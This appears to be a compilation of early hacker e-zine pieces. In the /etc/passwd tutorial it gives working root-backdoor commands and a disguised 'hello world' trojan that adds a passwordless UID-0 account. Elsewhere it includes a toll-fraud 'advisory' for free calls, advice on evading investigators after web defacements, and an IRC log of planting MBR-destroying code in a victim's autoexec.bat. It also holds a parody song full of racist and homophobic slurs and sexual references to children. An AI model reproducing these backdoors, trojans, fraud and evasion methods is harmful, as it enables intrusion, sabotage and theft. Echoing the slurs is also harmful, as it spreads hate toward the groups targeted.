Do you know that Bill Gates' real name is William Henry Gates III? If so, 
who gives a fuck, but he is known as Bill Gates (III) where III means the 
order of third, duh! So what's so weird about this name? OK, if you take 
all the letters in Bill Gates III and then convert it into ASCII and then 
add up all the numbers.... You will get 666. "Really? How do you 
know?"...Shut the fuck up and I’ll tell you

B = 66
I = 73
L = 76
L = 76

G = 71
A = 65
T = 84
E = 69
S = 83

I = 1
I = 1
I = 1 

Add these numbers and they equal 666(you can use pen or paper but I use the 
calculator on my computer cause I don't know how to add)Coincidence? Maybe, 
but take Windows 95 and do the same procedure and you will get 666. Still 
think it is coincidence? then your a dumb fuck. Okay, now for the good 
part. For those of you who still have the old Excel 95 try this out:
1. Open a new file
2. Scroll down to row 95
3. Click on the row 95 button to highlight the entire row
4. Press tab to move to the second column
5. Now, move your mouse and click on Help at the top
6. Then click on "About Microsoft Excel"
7. Press Ctrl-Alt-Shift and click on the tech support button at the same 
time
8. a window will appear with the title: THE HALL OF TORTURED SOULS

It has a doom style format and you can walk all around the hall using the 
arrow keys. And on the sides of the walls are the names of the tortured 
souls... Now walk up the stairs and then come back down, facing the blank 
wall. Now type in EXCELKFA this will open the blank wall to reveal another 
secret passage, walk through the passage and do not fall off. This is 
difficult to do. When you get to the end, you will see something really, 
weird. It could be a joke by MS programmers. Or is it? I don't know god 
dammit, don't ask me.

"State your name and jury number please."

"Ahhh... Mike Jasper. And I'm not sure what my jury number is. I heard 190-
something, but I was thinking it was 162. I'm not real sure."

I had just hit a home run, a towering Mark McGwire shot in the upper decks. 
The judge, the bailiff and the lawyers all looked at me with the same 
collective thought: This fucker's too stupid to be on the jury. And he 
might be high.

"Why you want to get out of jury duty for?" my comedian friend Mary C. 
asked me the next day. "You don’t want to be part of process of great 
system of justice in great country of America?"

Hmmm. I hadn't thought about it that way before. But it's true: I don't 
want to be part of the process of the great system of justice in this great 
country of America.

Why? Because I don't believe in the judicial system. Let me clarify: I 
believe it exists. I also believe it provides the best justice money can 
buy. But I don't believe 12 people selected randomly from a segment of the 
population too stupid to get out of jury duty can be expected to wade 
through incantations of legal voodoo and render the right decision.

With the exception of the OJ trial, of course. He was clearly innocent.

But I digress. I promised to tell you how to get out of jury duty and I 
plan to deliver on that promise:

How To Get Out of Jury Duty
1) Dress for success.

While few courts require you to wear a suit, most expressly forbid shorts 
or cut-offs, tee-shirts, tank tops or other so-called muscle shirts. Jeans 
are okay, provided they aren't torn or patched. Penny loafers rock.

In other words, it's the exact same dress code required by the Yellow Rose, 
a local Austin titty bar. Truth is, you can easily meet the court's dress 
code requirements and still create a repulsive image. All it takes is a 
little imagination.
Think costume.

On my appointed court date, I decided to go as a 70s rock star. (Note: 
Whenever possible, draw from your own experience.) I wore black slacks and 
black cowboy boots, a teal silk shirt unbuttoned one more button than good 
breeding would normally dictate, and the piece de resistance -- a full-
length black trench coat.
Unfortunately, I couldn't find my old shark-tooth necklace, which would 
have been the perfect accessory. My hair wasn't as long as I would have 
liked either, but I managed to spike it up pretty convincingly with a blow 
dryer. The beard played to type and the shades -- although not allowed in 
the courtroom -- added penache to my entrances and exits.

2) Choose your smell and stick to it.

There is nothing in the dress code about personal hygiene, likely because 
the courts don't want to consider the ugly possibilities.

I prefer the persistent smell of cigarette smoke, but then I'm a 
cigarette smoker (Again: Draw from your own experience). Every time I left 
the building for a cigarette break, I forced myself to smoke two butts: one 
for me, one for my clothes. Not only did this help me get out of jury duty, 
it assured me more elbow room in court.

You might prefer another scent, perhaps a natural one. If so, don't take a 
shower for several days before your appointed court date. Not only will you 
get out of jury duty, you might be excused early. Others may choose to 
employ a noxious aftershave or perfume. If so, I suggest you splash it on 
thick before leaving the house and carry around a bottle in your pocket for 
convenient booster applications.

This I guarantee: no one will ever question you about your smell. No one 
would dare take that kind of initiative. As a rule, all workplace 
decisions are made by committee. Short straw loses.

3) No matter what your occupation, fit the words "newspaper reporter" 
somewhere in your jury form.

All courts require potential jurors to fill out a form. If you're a full-
time parent, a felon or certifiably insane, you'll be able to check the 
appropriate box and get out of jury duty without having to attend so much 
as a single day in court. Why? Because if you're a full-time parent, a 
felon or certifiably insane, you're much more likely to smell (I'm telling 
you, they just hate that).

Assuming you're not one of the above, find the place on the form where 
you're asked to name your occupation. In that space, write the following: 
"I am currently a (Your Occupation), but I plan to become a NEWSPAPER 
REPORTER in the very near future."

Here's the deal: When you're on a jury, you are not allowed to discuss the 
case outside the courtroom. But once the jury's released, you can write for 
daylight. You can be colorful and describe how the defense lawyer spilled 
coffee on his trousers just minutes before his summation.

Officers of the court know what reporters do. And they hate what 
reporters do.

I hope anyone trying to get out of jury duty will consider my advice, for I 
can absolutely guarantee with Joe Namath-like certainty that my little 
three-point system will work every time. Unless, of course, you live in the 
state of California, in which case you're fucked, since the Golden State 
has recently passed laws against smelling, changing jobs, shark-tooth 
necklaces, smoking, aftershave use, the wearing of trench coats, and the 
writing of web pages offering advice on how to get out of jury duty.

Advisory released: Tuesday August 29, 2000

Severity: Pay-As-You-Go billing vulnerability on the part of Rogers/AT&T 
          allowing anyone (especially YOU!) to exploit it and make
          local/national/international calls for free.

Author: The Clone

--

Disclaimer; I don't take responsibility for anything in this file because
            an Iranian terrorist group known as 'habakkkoktao' has held me 
            at gun point requesting that I write this or they're going to 
            shoot me. Don't blame me, blame them!


Introduction;

  Rogers/AT&T (Canada) offers to its customers, a particular service plan 
known as the "ROGERS/AT&T Pay-As-You-Go Wireless Plan". This "plan" 
entitles 
you to full local, national, and international wireless service within the 
coverage areas that it offers (see www.rogers.ca for coverage info).

In order to make use of the pre-paid wireless service, 
		you must firstly sign up by: 


1. Dialing one of the following toll-free numbers from a landline phone; 
   (Between 8:00am-9:00pm weekly, 8:00am-6:00pm Saturdays and holidays)
   
   1-800-663-1415 - British Columbia, Alberta, Saskatchewan, Manitoba
   
   1-800-268-7347 - Ontario  
   
   1-800-361-0538 (1-800-ROGERS AT&T) - Quebec, New Brunswick, Nova Scotia,
                                        Prince Edward Island, Newfoundland

			     OR

2. Walk into any Rogers/AT&T store or certified dealership and sign up 
there.
   Want to order over the phone or need help finding the nearest 
dealership?
   Call: 1-888-448-7994

			     OR

3. Buy 'Pay-As-You-Go' online:
   http://www.rogers.ca/wireless/english/voice/pay/buy/index.html


Pre-Paid Cards;

By going to any Rogers/AT&T wireless store location, you can pick yourself
up one of many different Pay-As-You-Go cards. What I usually buy are the 
$25 
1-hour cards because they're cheap and I'm not really huge on talking on 
tumor
causing insecure radio transmitter/receivers. 


Activating your Card;

After purchasing your pre-paid card, what you can do is call up one of the 
INWATS number listed above (from a landline) that services your local area
and speak to one of the friendly customer service representative who'll
be MORE than happy to help you out. Tell them that you just purchased a
pre-paid card and that you'd like them to renew the time to your phone.


Re-filling your time;

Either buy another Pay-As-You-Go card from a Rogers/AT&T dealership, 
call them up and pay with your credit card, OR see step 3 [above].

--

 The Vulnerability - as a scenario.

- Johnny picks up his wireless Rogers/AT&T pre-paid phone and turns it on

- Johnny hears a beep, looks at his phone and notices that he has a lot of
  battery power left - Johnny feels glee and lets out a huge *sigh*

- Johnny then proceeds to dial his boyfriend Frank's phone number

- Johnny prepares to listen to the beautifully sounding automated female 
  recording (that makes him for a moment in his very homosexual life want
  to be heterosexual just so he'd know what it was like to actually lust
  for such an angelic voice) read off the number of minutes he has left
  for his call (account balance). 

- Too bad for Johnny; no automated voice at all! "What duth dith mean?"
  lisps the very gay, confused, and curious Johnny.


Well Johnny, what just occurred was simple; 

The Rogers/AT&T's Pay-As-You-Go billing system didn't recognize your 
account,
therefore you weren't billed for that particular call. Each time the 
automated
voice plays, you're billed for the call - each time it doesn't, you aren't.
I've estimated (with my personal experience) that the billing errors occur
approximately 40% of the time while 60% of the time the billing goes 
through
absolutely fine.


One could easily exploit this vulnerability by;

Hanging up the call every time the automated voice appears on the phone, 
re-dialing the desired number and repeating the process until the automated 
voice doesn't appear.

Simply only pay for one $25 Pay-As-You-Go card and keep exploiting the 
Rogers/AT&T system, calling any number you wish in the world for absolutely 
free! No one gets billed, no one is hurt. 

Leech off the capitalist pigs while you still can!

-END-

We're gonna have a problem here..


Ya'll act like ya've never seen a 40 year old virgin before,
Jaws all on the floor like bronc, like jericho just burst in the door and
started whippin' his ass worse than before. they first were
divorce. throwin' him over furniture. (AAAHHH!).
It's the return of the "Ah wait, no way,you're kidding. he didn't just
touch my penis did he?". And Vegtam said... NOTHING YOU IDIOTS! VEGTAM'S
DEAD HE'S LOCKED IN K-RAD-BOB'S BASEMENT! Feminist lesbians love RLoxley
"h0h0h0, I'm sick of him, look at him walking around grabbin' his 
you-know-what, wavin' it at those poor little kids" - "Yeah, but he's so 
gay though." Yeah he's  probably got a couple o' cobwebs in his underpants
but no worse than whats going on in his bedroom (*orgasm*). Sometimes he
just wants to get on usenet and just let loose, but can't. But it's cool
for JP to hump a fat slut. My bum is on his lips! My bum is on his
lips! And if I'm lucky he might just give it a little kiss. And thats the
message that he delievers to the kids in #hackphreak and expects them not
to know what winnuke.c is. Of course they're gonna know what homosexuality
is, by the time they meet Accipiter they've been assfucked ten times,
haven't they?. We ain't nothing but mammals, Well some of us faggots who
suck other guys' dicks for fun. But if we can hump 7 to 12 year olds then
there's no reason why bronc and jericho cant elope. But if you feel like I
feel with my 18 incher. Women, wave your pantyhose. Sing the chorus and it
goes..

I'm Prae, and I don't like niggers one bit.
All you other Prae's are just imatatin'
So wont the real Prae please stand up, please stand up, please stand up?
[sing it twice]

BobsKC don't gotta cuss to get his point across, well I do, so fuck him
and fuck you too! You think I give a fuck about DEFcon? half of you lamers
cant even stomach me, let alone stand me. "But we want you to come,
Prae!" Why? So you guys can just lie, to get me here and sit me here next
to viXen900? (EWWW!). Cass better switch me chairs so I can sit next
to k-rad-bob and twist an hear em' argue over who she gave head to first.
Little bitch, fuckin' me around. "Oh, you're so sweet, Prae. hee-hee." I
should post her naked pics on the b0g BBS and show the whole world how
you gave Prae VD! I'm sick of you fuckin' scene whores, all you do is
annoy me, so I have been sent here to fucking kill you.
And there's a million of us just like me, who cuss like me and just dont
give a fuck like me, dress like me, walk, talk and act like me. It just
might be the next best thing but not quite me!

I'm Prae, and I don't like niggers one bit.
All you other Prae's are just imatatin'
So wont the real Prae please stand up, please stand up, please stand up?
[sing it twice]

I'm like a head trip to listen to, cause I'm only givin' you things you
joke about with your friends in your /msg window, the only difference is I  
got the balls to say in front of ya'll and I don't gotta be false or sugar
coated at all, I just sit at my term and spit it and wether you like to
admit it, i just shit it better then 90% of you faggots out there. And you
wonder why these kids look up to me? It's funny, cause at the
rate im goin'. When I'm 30 I'll be the only person in the nursin' home
flirtin', pinchin' nurses asses when im jackin' off with jergens and im
jerkin' but this whole bag of viagra isn't workin'. And every single
person is a Prae lurkin'. he could be working at Burger King spittin' on
yo onion rings, or in the parkin' lot circlin', screamin' "i dont give a
fuck!" with his windows down and his system up! 

So will the real Prae please stand up and stick one of those fingers on
each hand up (RLoxley's ass!). And be proud to be outta yo' mind and outta
control, one more time, loud as you can, how does it go?

I'm Prae, and I don't like niggers one bit.
All you other Prae's are just imatatin'
So wont the real Prae please stand up, please stand up, please stand up?
[sing it 4 times]

Haha, I guess there's a Prae in all of us.
Fuck it. Lets all stand up.

MPAA legal team: “Well this is obviously a huge victory for consumers 
world wide. The movie industry is now free to continue its monopoly of 
digital storage for film.” (Ummmm… right.)

The script kiddies: “It’s all over man. 
This is just the beginning; next they'll be raiden our houses man. I 
gotta go man, my friends and I are gonna smurf the MPAA web site dude.” 
(Good thought, that way the hoards of people who want to visit the MPAA web 
site at 2:30 in the morning won’t be able to.)

The web designer: “Huh? Why do DVD’s have cascading style sheets on them 
anyway? And why would you wanna take them off?” (Now see these guys are 
smart, make web sites get rich, what the heck am I doing looking for 0day 
exploits in openBSD, I’m gonna be a web designer, that’s where the cash 
is!)

The guy off the street: “What the heck’s a 2600? DeCSS what’s that? I 
ain’t got time for no mind games mister, I’m already late, outta my 
way.” (*Sigh*)

The leet0 hacker: “Who cares? It’ll take me five minutes to write my own 
ripper for DVD’s, I could care less.” 
(I like this guy)

The sysadmin: “Dang script kiddies, hope they rot in jail. Who cares? I can 
still find it all over the web.” (2600? Script kiddies? Hmmm… interesting 
thought)

The 2600 legal team: “It sets a dangerous precedent.” (That it does)

Me: I really don’t see a down side to this whole deal. If 2600 wins on 
appeal, then the MPAA looks stupid and 
2600 keeps on mirroring. If 2600 loses 
then the MPAA looks like an ogre and a 
whole bunch of other sites take up the 
mirrors. (Its already starting, I 
noticed a slight increase in the number 
of sites that showed up in search 
engine searches for DeCSS mirrors) 
Congrats MPAA, you just started a grass roots revolution dedicated to 
spreading DeCSS all over. And I really wanna see them enforce us law in 
Pakistan or something. 2600 can win or lose, the MPAA can’t win.

First of all, I'd like to say that if this article turns out weird,
forgive me. I'm writing this at 3 AM. (I know, that's what everyone
says, but it's true! ;)   )
Oh, and I'm writing this in Pico!!! Muahaha, Pico 0wnz ........
along with b0g of course.
I tried to be funny, but I really lack a sense of humor, so just
pretend to laugh .... please?!
And if you're wondering why all the progs here are in /bin/sh and 
not in C. It's because shell-scripting is so much faster than writing
some fucked up C programs ... and I am tired.
Oh, and sorry but I suck too bad to make any neat ascii art.

III.)  Explanation of /etc/shadow
IV.)   The Fun Part: H4x0ring /etc/passwd and /etc/shadow
V.)    Conclusion
VI.)   b0g 0wnz Program!

================
I.) Introduction
================
Since you're a really leeto H4x0r (right?!) you've heard 
of this thing called Linux. If you're uberleet you might have 
even heard of Unix, *BSD, Irix, Minix, Xenix ...
Well if you haven't, let's pretend you have, cause we wouldn't 
want to ruin your l33t0 H4x0r 1m4g3. Since you've heard of Linux
(!), you've also heard of this file called /etc/passwd and another
file called /etc/shadow. You know that you need those philes for 
your leeto h4x0ring.  
Riiiight. So why do you need those files for your leeto
h4x0ring?? It's quite simple: Cause you do!! Now that that's clear,
let's proceed to II.)

II.) Explanation of /etc/passwd
The /etc/passwd file is the file that contains information
about all the users on the system (including their password, unless
it is shadowed ... but we'll get into that later). So let's take a
look at an example /etc/passwd file. Let's take mine ... no! Just 
kidding, freaks! It is usually world-readable. If you don't know what that 
means,
well, then you're not leet!

Here it is:
root:lECN8annvOh/M:0:0:Rewt,Rewt Office,1-800-GAY-SEX,1-800-WITH-
DOGS:/root:/bin/bash

The first part (you know, the one that says root) is the login of the 
person.
This dude's login is root, if you're really leeto you know what that means, 
eh?

The second part is his DES-encrypted password. Everytime you enter your 
pass at the login it gets encrypted with DES and compared to the one in the 
/etc/passwd 
(or /etc/shadow) file.  It's 'mypassux' by the way. How I know?
Cause I'm the one that created his pass. But you might have just run 
something like John The Ripper over it ... since you're leet. Newbie Note: 
BSD uses blowfish for encrypting passwords.

The third part is the GECOS information. GECOS means General Electric 
Comprehensive Operating System if you must know. Let's finger root (no, not 
in the perverted way) to seen an example of the GECOS information.  
$ finger root (I'm not using the '#' prompt, because I don't think you're 
leet enough)
Login: root                            Name: Rewt 
Directory: /root                       Shell: /bin/bash 
Office:  Rewt Office, 1-800-GAY-SEX    Home Phone:  1-800-WITH-DOGS 
On since Wed Aug 23 19:20 (CEST) on tty2, idle 6:39 
No Mail.
No Plan.                   

Ok, what does this tell us? The first GECOS field is the Name, the second 
one is the Office, the third one is the Office phone and the fourth one is 
the Home Phone. 
Also it tells us that Rewt is quite gay and fucks dogs ];->.

The fourth part is the UID (User ID). User root (that's the sysadmin) 
_always_ (unless some mindless prick changed it) has UID 0. The lower your 
UID the more permissions you have. The 'normal user' UIDs usually start at 
500.

The fifth part is the GID (Group ID). See above.

The sixth part is the leeto home directory root 0wnz. In this case it's 
/root.
Well, it usually is. Normal users will probably have something like 
/home/mycrappyloginname. But root rulez the system so he gets a homedir 
ascending right from the root-directory ('/'). 

The seventh part is the shell the user uses. Root is leet so he goes around
bashing people up ... In other words, he uses the leat bourne again shell
/bin/bash. A normal user might be using /dev/null ^H^H^H^H^H^H^H^H^H^H 
];-> /bin/sh, /bin/bash (yes, normal users can be leet), /bin/csh, 
/bin/tcsh,
/bin/zsh ...

So basically the format for a /etc/passwd entry would be:
login:encrypted-password:UID:GID:name, office, office phone, home 
phone:home-dir:shell

Now try out my leeto adduser program
----Begin copy here----addleetouser.sh---by MagicTux----
#!/bin/sh
if id | grep root
then
 echo "Enter Login"
 read vlogin
 echo "Enter UID"
 read vuid
 echo "Enter GID"
 read vgid
 echo "Enter Gecos information (name, office, office phone, home phone) 
separated by commas"
 read vgecos
 echo "Enter Home Directory"
 read vhome
 echo "Enter Shell"
 read vshell
 echo
 echo "Creating account ..."
 echo "$vlogin::$vuid:$vgid:$vgecos:$vhome:$vshell" >> /etc/passwd
 echo "Finished"
else
 echo "You have to run this program as root, you totally fucked up Lamer!"
fi
		  
exit 0
--------Ok, you can stop copying now--------------------

So, what does this leeto program do? It lets you create a user without a 
password. So, next you login with that user (you won't be asked for a 
password). Then you type the command 'passwd' to create a password. Why? 
Because you don't want other leeto H4x0rs to use your account.

Got that?
Ok, then move along to III.)
(fuck, I'm good with these Roman(or was it Greek?) numerals ;) )

================================
III.) Explanation of /etc/shadow
================================
Now that you're leet (well, sort of) and know what /etc/passwd is, you can 
learn what the /etc/shadow file is. 
Nowadays, most systems fortunately/unfortunately use a technique called 
shadowing.
This 'shadowing'-technique creates a file called /etc/shadow. This file is 
not world readable or anything. This /etc/shadow file contains the 
encrypted password. So, let's take a look at an example (I love examples!)

Here's the /etc/passwd file now with shadowing
root:*:0:0:Rewt, Rewt Office, 1-800-GAY-SEX, 1-800-WITH-
DOGS:/root:/bin/bash

What difference to the previous /etc/passwd file do we notice? None. Wrong!
Now instead of the encrypted pass there's a '*'. Now don't go and try 
logging in as root with the pass '*'. That's not leet (and it won't work 
anyway). So now you wonder where the encrypted pass went? This is where the 
/etc/shadow file comes in.

Here's the /etc/shadow file with shadowing (DUH!)
root:lECN8annvOh/M:::::

So what does that mean?
It means that root's encrypted pass is stored in the /etc/shadow file, 
which is not world-readable (unless the sysadmin is totally fucked up). 
This meaning, that you have to be root to be able to see the encrypted 
pass. 

Well? Get root!!!

So, now let's edit addleetouser.sh so it works with shadowing.
Newbie note: If you don't make an entry in the /etc/shadow file,
your newly created pass will be put in /etc/passwd.

----Begin copy here----addleetouserwithshadowing.sh---by MagicTux---- 
#!/bin/sh
if id | grep root then
 echo "Enter Login"
 read vlogin
 echo "Enter UID"
 read vuid
 echo "Enter GID"
 read vgid
 echo "Enter Gecos information (name, office, office phone, home phone) 
separated by commas"
 read vgecos
 echo "Enter Home Directory"
 read vhome
 echo "Enter Shell"
 read vshell
 echo
 echo "Creating account ..."
 echo "$vlogin:*:$vuid:$vgid:$vgecos:$vhome:$vshell" >> /etc/passwd
 echo "$vlogin::::::" >> /etc/shadow
 echo "Finished" 
else
 echo "You have to run this program as root, you totally fucked up Lamer!" 
fi
 
exit 0
--------Ok, you can stop copying now-------------------- 

So, if you're leet enough to understand this, you might have noticed that
we only added one line. Not that complicated, eh? Well maybe for you ... 
but, you know what I mean. If you're even leeter, you might have even 
noticed that the line added was 'echo "$vlogin::::::" >> /etc/shadow. See 
explanation for this above, or figure it out yourself. Well, and we added a 
* in the echo "$vlogin:*:$vuid:$vgid:$vgecos:$vhome:$vshell" >> /etc/passwd 
command, but that doesn't count ;). 

Now that you understand all of this stuff with /etc/passwd and /etc/shadow
you can move your eyes down a bit and read part IV.)
(If you didn't understand anything, beat yourself up and reread this far
until you've got it all down.)

=======================================================
IV.) The Fun Part: H4x0ring /etc/passwd and /etc/shadow
=======================================================
So, now that you've learned all sorts of weird shit and stuff about 
/etc/passwd and /etc/shadow you wanna find a neat use for them. I don't 
suppose, you could be creative and come up with something on your own, so 
I'll give you some hints and ideas on what you could do.

Well, let's start out with something scary like 'The Login Backdoor' since
you wanna keep root once you've got it, cause you're a lame script kiddie.
If this sounds scary to you, go jerk off under your blanket and you'll feel
better. Then come back and finish reading this article. 

So what exactly is a login backdoor? Actually if you're asking this 
question and still haven't come up with a creative answer on your own, 
you're quite stupid.
But I'll tell you anyway: A login backdoor is simply where you create a new 
account of your own, by typing something like this:
# echo 'magictux:*:0:0:MagicTux, 0wnz, This, b0x:/magictux:/bin/bash' >> 
/etc/passwd  

ok, 2 things about this command: a) I'm using the '#' prompt, because I'm 
leet enough ];->
and because I need to be root to execute that command anyway. 

Now we execute this uberleeto command:
# echo 'magictux::::::' >> /etc/shadow

Notice once again the leeto '#' prompt. Also notice, that instead of typing 
these stupid commands you could just run the leeto 
addleetouserwithshadowing.sh script. But that probably isn't leeto enough 
for you!

Well, let's continue with our leeto commands:
# su magictux
# passwd

Yep, we now have installed our login backdoor successfully. We can now 
telnet or whatever to our 0wned box and login with our login backdoor 
username and the password we just made with that leet passwd command. Now 
we can all make bets on how long it's gonna take the sysadmin to notice 
someone added a leeto account and hope we might actually get in once 
more before getting busted by the FBI ...

A less obvious login backdoor would be to check, which users haven't logged 
in for a while (no, not like 3 minutes, more like a few months). Then we 
can assume that they probably will never log in again, or think they forgot 
their password when they do try.
How we'd do this is, get a list of all logins, then finger them (no, not 
the perverted way again; I know this is getting boring, since you're all 
horny from reading all this leet stuff) and check when they last logged in. 
If it's a good while back, we'd edit the /etc/shadow file (or /etc/passwd, 
if shadowing is disabled (which is very unlikely)) and delete the password 
of that user. Thus enabling us to type the passwd command and create
a new one for them.
It might look something like this:
# cat /etc/passwd
<SCROLL>
# finger bob  (one of those thousand users)
<finger stuff>

Last logged in: Quite a while ago

# bingo
bash: bingo: command not found
# pico /etc/shadow (yes we use pico, because pico 0wnz!!)
<shadow file>
^W bob
bob:abjkle3cjoij3o:::::

and we change that line to
bob::::::
^X
y
<enter>

Congratulations! You stupid ass fuck have just set up an even leeter than 
the previous login backdoor. I know that example above was very bad, but 
it's getting late and I'm getting all weird. Ok, now be creative and write 
a bunch of cool backdoors and exploits and trojans and lotsa other leeto 
stuff with /etc/passwd and /etc/shadow.

In closing, I'll present you with what I call the hello-world-passwd-
trojan: 

----Begin copy here----hello.c---------by MagicTux----
#include <stdlib.h>
/* For you ignorant fuck, compile with gcc -o hello hello.c and put hello 
int root's homedir or sumthin */

void main() {
 printf("Hello, World\n");
 system("echo 'magictux:*:0:0:magictux,0wnz,j00,!:/magictux:/bin/bash' >> 
/etc/passwd'");
 system("echo 'magictux::::::' >> /etc/shadow");
}    
--------Ok, you can stop copying now--------------------

So compile the program and put it in root's dir or sumthin.
And now we'll assume root is this REAAAAAALLY stupid guy, and he actually 
runs your prog.
He gets Hello world printed into his screen and thinks everything's all 
right (remember, he's really stupid). So now that this stupid little fuck 
actually ran your program, you should be able to login with magictux (no 
actually you shouldn't, get an own nick!)without a password prompt. 
Enjoy!!! ;)

==============
V.) Conclusion
==============
So, now that you're such a kick ass leeto h4x0r, go pick up the next hot 
ch1x0r j00 see and impress her with your leeto echo '' >> bla commands and 
stuff. Show her how leet you are and make her a leeto root account. After 
you impressed her, fuck her.

Also, you've probably read a thousand guides telling you that you should 
pick your password really weird, something like Ac397cjklae27ac.j3+a73. 
Don't listen to them, they all suck.
Just have your password have two capital letters and 2 or 3 numbers and 
you'll be doing fine.
Have your password something like 7l3eT0Iam (7leetoiam), it's easier to 
remember (might not make any sense, but at least you have a word in it) and 
still safe. I'm quite sure nobody will guess that. 

And anyway if you're totally paranoid or sumthin, get BSD, cause it uses 
blowfish instead of DES which is a whole fuckin lot securer. Also you could 
maybe set up a tripwire on the /etc/passwd and /etc/shadow files. Well, 
maybe you could, probably not because you suck. But you can always
try!

Also, I plan on writing this ultra-secure login and password stuff. It's 
gonna use rot13 encryption.
So, wait for it. I'll publish it sometime. I'm gonna write a new login for 
linux and stuff, that will use rot13 encryption and a passwd program that 
will change your password to a rot13 encrypted one.
Oh yeah, and it's not even going to be shadowed. I tell ya, no one can 
crack rot13 ;) Seriously, so after I gave it to you, you'll have to give me 
your ip, just so, not that there's any reason ...

Maybe, sometime I'll make this ultra-super-secure login and password stuff 
that won't use any encryption and shadowing at all. Man, that would rock!!! 
But that'll take a while, until I've made that.

Have fun!

==============================
VI.) The b0g 0wnz j00! Program 
============================== 

----Begin copy here----b0g0wnzj00.sh---by MagicTux-----
#!/bin/sh 
trap 'echo b0g 0wnz j00!' INT 
while true 
do
 echo "b0g 0wnz j00!"
 echo -e \\a
done 
--------Ok, you can stop copying now-------------------- 

What does this program do:
It goes into an infinite loop of printing b0g 0wnz j00! and beeping.
It traps ^C so you cannot exit it except for kill -9 <pid>-ing it.

Recommended Uses:
./b0g0wnzj00.sh > tty<ttynumberofannoyingfucker>
./b0g0wnzj00.sh

Some time ago Anti Online posted a piece entitled, "Hacker Profiling" I 
read it considered it and then forgot it. Recently ph33r-the-b33r 
defacements have taken to addressing this theme. 
While they hit some basic points they don't go deep enough into how you can 
thwart profilers. So here it is Counter Profiling.

First off lets discus the current method for tracking down and 
prosecuting hackers/crackers/script kiddies. One would think that the feds 
are hot on the tails of every one who defaces. If you look at the mirrors 
and figure a five-man team for each defacer, you suddenly have a huge army 
looking for defacers. Of course this is not how it works. 

The feds get involved when 
1) A company makes a big fuss 
2) A company losses a bunch of cash 
3) Serious threats are made, or 
4) The person keeps on doing it. 

So the first step in avoiding hacker profilers is, don't cause monetary 
damage, don't piss off the admin too much by deleting everything off the 
server, and spread them out. Those people who have blocks of 5 to 10 hacks 
all in a row on attrition will gain more fed attention than 10 defacements 
spread out over a few months. (Get a life, more than 3 sites in a day and 
you have toooo much free time)

Next up: Your IRC habits, they are bad. 
People in IRC have no clue who they are talking to. Never tell people where 
you live, what you do, who your friends are etc. Create separate dentifies. 
For instance, I (Ripped) go by several names. The people, who know me in 
real life have no clue that they know Ripped_edge, they know me as some one 
else. Nothing connects my identifies. 
For example about 6 months ago before I was Ripped I was known as Arkan. 
Arkan lived somewhere in Indiana worked for a large networking company, and 
was starting college some where around there. None of that is remotely 
true. Nothing pertaining to what I tell people I do now with this nick is 
remotely true. By covering your tracks you make it that much harder to be 
profiled.
Your host name on IRC, lost of ways to fix this. Some people use a free ISP 
where they entered bogus names and such, good, but did you bother to check 
if they log phone calls? Ouch. Next up spoofing accounts, good and nice 
proof of your l33tness, but when you enter a chat room as user@fbi.gov, 
profilers know you are spoofing and start working on it. Stolen accounts, 
possibly the best, but again make sure the ISP does not log phone calls. My 
personal fav is realistic spoofing. Rather that risk stealing an account or 
spoofing outrageous host why not spoof something like 
user.userid.coolispthatidontuse.com. 
The profiles will spend ages talking to that ISP only to find no account 
exists, and you in the mean time are gone. One thing to note always be 
consistent, spoof the same host every time, else the ruse is up.
Going back to the identify deal. Ideally you have an identity for each 
different defacement, a separate identity for IRC, and then a few others 
for fun. Never discuss your identifies with friends or any one. Never 
discuss your defacements or provide any clues that could link your 
identities together. Why people feel the urge to brag about their hacks is 
stupid. You'll just get caught faster.
Your friends in this world will not always be your friends. I was sitting 
in on one group and collecting information. (Yup, I'm a hax0r profiler 
too) There was one member of this group who for the life of me I could not 
get any info on. I knew the city he lived in but that was about it. All the 
others I had addresses, pictures, phone numbers, the works. Suddenly a huge 
rift split the group into two groups and ended up isolating the one member 
I had no info about. My chance, which I jumped at and I now had his address 
and phone number and picture. A complete list of the entire group, how 
nice. Now if he had not told his friends so much about him I would not know 
any thing, but now I do. Profilers are more than happy to take advantage of 
intra group wars, and they can be quite profitable.

A few other points: 
Make sure you know whom bots belong to and don't let other in.
Watch for people who ask a lot of personal questions, and people who 
never talk two traits of a profiler. Remember most profilers are NOT feds 
but security consultants, they don't have search warrants and ISP don't 
help them then, with some Identity shuffling you can thoroughly confuse 
these profilers.
Do not discuss you actions with others
No links between online life and offline life
Nothing on your computer should be able to identify you

In Anti online's hacker profiling series they use one example of a person 
saying, "I'm off to play quake" as what was needed to break the case. Yup 
its true sometimes that's all you need. But lets say you had an identity 
that you used on that server that said you went to xyz university and not 
the abc one that you really attend. As you’re off to play quake, the 
profiler is off to waste time digging through and watching some poor soul 
at the wrong university. Lastly remember to keep your identities strait. 
Think carefully about whom you are supposed to be and answer (and talk 
if you have some dialect studies under your belt) accordingly. If you do 
confuse them and start confusing people, remember it's better for them 
to be confused with all sorts of erroneous info than to have the right 
info.
And keep your mouths shut about your hacks. It makes my job too easy, and I 
need a challenge. (The whole point of me writing this)

[01:26] <Evul> thats easy enuff .. 
[01:26] <Evul> cant ya send command "exitwin" ?
[01:26] <^mdrg^> i can only read and write to his HD
[01:27] <^mdrg^> so i put ur proggy in \ and placed the cmd in autoexec.bat
[01:27] <Evul> =]
[01:27] <Evul> ya man
[01:27] <Evul> then he gets one more session
[01:27] <^mdrg^> i'm DoSing him
[01:27] <Evul> I *could* fix the prog to hang up after nuking the MBR
[01:27] <^mdrg^> right know
[01:27] <Evul> so then he wont get back to OS
[01:27] <Evul> =]
[01:28] <^mdrg^> nah
[01:28] <^mdrg^> i just DoS him so he'll have to reboot
[01:28] <^mdrg^> but if ur proggy is ok, he won't come back
[01:29] <Evul> after reboot . he will have one more windows session
[01:29] <Evul> cause the disk will boot before the program runs
[01:29] <Evul> the next reboot will fail
[01:29] <Evul> but its too late then .. damage done
[01:29] <^mdrg^> add a 'jmp $'
[01:29] <Evul> =P
[01:29] <^mdrg^> he'll have to reboot
[01:29] <^mdrg^> quick quick !
[01:29] <Evul> right
[01:29] <Evul> hang it up
[01:30] <^mdrg^> i hope that i didn't alread DoS him
[01:31] <^mdrg^> it's ok ?
[01:31] <Evul> that one will not allow another reboot
[01:31] <^mdrg^> sweet revenge :)
[01:31] <Evul> hehehe

Apparently some of our fine readers are a bit dense in the head. Either 
that or the entire civilized world is a bit dense in the head, and knowing 
our readers, it *must* be the world. To explain things further, this 
article is a kind of part two, kind of reinforcement of part one.

I got the following letter after part one was published:

To protect the innocent, I will leave his email address so you can poke fun 
at him. Now, I dont know what kind of messed up shit you guys do to your 
